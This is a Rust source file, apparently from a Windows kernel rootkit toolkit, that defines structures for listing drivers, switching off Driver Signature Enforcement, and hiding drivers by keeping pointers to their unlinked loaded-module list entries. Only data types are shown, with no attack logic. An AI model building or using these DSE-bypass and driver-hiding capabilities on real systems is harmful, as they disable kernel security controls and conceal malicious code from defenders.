use super::LIST_ENTRY;
use core::sync::atomic::AtomicPtr;
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;

/// Enumerates driver information for system drivers.
///
/// This struct holds basic information about a driver, including its address, name, and an index
/// for identification. The `name` field is represented as a UTF-16 array to maintain compatibility 
/// with systems that use this encoding (like Windows).
#[repr(C)]
pub struct DriverInfo {
    /// The memory address where the driver is loaded.
    pub address: usize,
    
    /// The name of the driver, stored as a UTF-16 encoded string with a fixed length of 256.
    pub name: [u16; 256],
    
    /// The index of the driver in the enumeration.
    pub index: u8,
}

/// Represents a structure to enable or disable Driver Signature Enforcement (DSE).
///
/// This struct is used to toggle the state of DSE, with the `enable` field indicating whether
/// DSE is currently enabled or disabled.
#[repr(C)]
#[derive(Debug)]
pub struct DSE {
    /// A boolean flag to enable or disable DSE. `true` means DSE is enabled, `false` means it is disabled.
    pub enable: bool,
}

/// Stores the values related to a hidden driver.
///
/// This struct is used to keep track of a driver that has been hidden from the system. It stores 
/// the driver's name and relevant pointers to system structures such as the driver's list entry and 
/// data table entry.
#[repr(C)]
#[derive(Debug)]
pub struct HiddenDriverInfo {
    /// The name of the hidden driver as a dynamic string (heap-allocated).
    pub name: alloc::string::String,
    
    /// A pointer to the `LIST_ENTRY` structure representing the driver's list in the system.
    pub list_entry: AtomicPtr<LIST_ENTRY>,
    
    /// A pointer to the `LDR_DATA_TABLE_ENTRY` structure that represents the driver's data in the system.
    pub driver_entry: AtomicPtr<LDR_DATA_TABLE_ENTRY>,
}


/// Represents the target driver for operations like hiding or revealing it.
///
/// This struct holds information about a driver, specifically its name and a flag indicating whether 
/// it should be enabled (visible) or hidden.
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetDriver {
    /// The name of the target driver as a dynamic string (heap-allocated).
    pub name: alloc::string::String,
    
    /// A boolean flag that indicates whether the driver is enabled (visible) or hidden. 
    /// `true` means the driver is enabled, `false` means it is hidden.
    pub enable: bool,
}